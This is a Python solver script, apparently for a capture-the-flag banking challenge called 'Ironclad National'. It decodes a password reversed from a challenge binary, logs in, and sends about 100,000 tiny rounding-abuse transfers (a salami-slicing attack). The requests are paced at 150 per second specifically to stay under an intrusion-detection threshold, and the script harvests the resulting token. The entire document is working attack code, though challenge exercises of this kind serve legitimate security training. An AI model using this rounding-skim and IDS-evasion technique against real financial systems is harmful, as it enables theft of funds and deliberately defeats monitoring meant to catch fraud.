#!/usr/bin/env python3
"""
Solver for Bank 1 — Ironclad National
Exploit: Banker's Rounding
Rate: ~150 req/s (just under IDS 200 req/s limit)

Usage: python3 solve_bank1.py <host> [port]
"""
import socket, time, sys, asyncio

HOST = sys.argv[1] if len(sys.argv) > 1 else "localhost"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 9001

# Reverse-engineered from auth_node_1.elf
XOR_KEY    = bytes([0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE])
XOR_CIPHER = bytes([0xB7, 0xDF, 0xD1, 0x81, 0xAC, 0x91, 0xC8, 0xCA])  # "ironfort" XOR'd
PASSWORD   = "".join(chr(XOR_CIPHER[i] ^ XOR_KEY[i % len(XOR_KEY)]) for i in range(8))

# Exploit magic value
MAGIC = "0.0150000000001"
DELAY = 1 / 150  # 150 req/s — below IDS limit


def recv_until(s, prompt):
    buf = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        buf += chunk
        if any(p in buf for p in [prompt] if isinstance(p, bytes)):
            break
        if isinstance(prompt, str) and prompt.encode() in buf:
            break
    return buf.decode(errors="replace")


def solve():
    print(f"[*] Connecting to {HOST}:{PORT}")
    print(f"[*] Password (from XOR reversal): {PASSWORD}")

    s = socket.socket()
    s.connect((HOST, PORT))
    s.settimeout(10)

    def recv_prompt(p):
        buf = b""
        while p.encode() not in buf:
            buf += s.recv(4096)
        return buf.decode(errors="replace")

    # Auth
    recv_prompt("Password: ")
    s.sendall((PASSWORD + "\n").encode())

    welcome = recv_prompt("ironclad> ")
    print(welcome.strip())

    # Extract session ID
    sid = None
    for line in welcome.split("\n"):
        if "Session ID:" in line:
            sid = line.split("Session ID:")[1].strip()
            print(f"[*] Session: {sid}")

    token = None
    count = 0
    t_start = time.time()

    print(f"[*] Starting Salami Slice — 100,000 transactions at 150/s")
    print(f"[*] ETA: ~{100000/150:.0f}s (~{100000/150/60:.1f} min)\n")

    while not token:
        s.sendall(f"transfer {MAGIC}\n".encode())
        resp = b""
        while b"ironclad> " not in resp:
            resp += s.recv(4096)
        resp = resp.decode(errors="replace")

        count += 1
        if count % 1000 == 0:
            elapsed = time.time() - t_start
            rate = count / elapsed
            pct = count / 1000
            print(f"\r[*] Tx: {count:,} | ${pct:.2f} | {rate:.0f} req/s", end="", flush=True)

        if "TOKEN_" in resp:
            for line in resp.split("\n"):
                if "TOKEN_" in line and "Token:" in line:
                    token = line.split("Token:")[-1].strip()
            break

        if "locked" in resp.lower() or "IDS" in resp:
            print("\n[-] Account locked! Slow down.")
            break

        time.sleep(DELAY)

    print(f"\n[+] DONE — {count:,} transactions")
    if token:
        print(f"[+] TOKEN: {token}")
        with open("tokens.txt", "a") as f:
            f.write(f"BANK1:{token}\n")
    s.close()
    return token


if __name__ == "__main__":
    solve()
